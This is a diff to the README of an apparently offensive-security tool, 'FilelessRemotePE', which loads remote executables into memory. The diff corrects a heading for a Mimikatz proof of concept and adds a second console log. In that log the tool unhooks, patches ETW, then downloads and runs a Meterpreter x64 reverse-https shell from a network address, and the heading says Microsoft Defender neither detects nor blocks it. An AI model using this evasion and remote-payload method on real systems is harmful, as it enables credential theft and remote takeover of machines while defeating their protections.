@@ -596,8 +596,8 @@ The tool "FilelessRemotePE" allows to load directly into memory remote Portable 
 
 Limitation: It runs only c/c++/asm based binaries.
 
-Test/PoC - Download and execution in-memory of Mimkatz.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Test/PoC 1 - Download and execution in-memory of Mimikatz.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 C:\Users\Administrator>powershell -exec bypass
 Windows PowerShell
@@ -677,6 +677,28 @@ SID               : S-1-5-21-1644803877-2661921197-3301414406-500
 
 mimikatz # exit
 Bye!
+
+
+Test/PoC 2 - Download and execution in-memory of a x64 Meterpreter reverse https shell on a Windows 10 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Microsoft Windows [Version 10.0.19044.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Documents\Tools-AD> RemotePEv1.exe
+
+[+] Unhooking
+
+[+] Patch ETW
+
+[+] Enter the uri :
+http://192.168.1.30:8080/Pivoting-with-MSF/meterpreter-x64-reverse-https.exe
+
+[+] Loading Remote PE from http://192.168.1.30:8080/Pivoting-with-MSF/meterpreter-x64-reverse-https.exe
+
+[+] Run PE
+
+
 
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
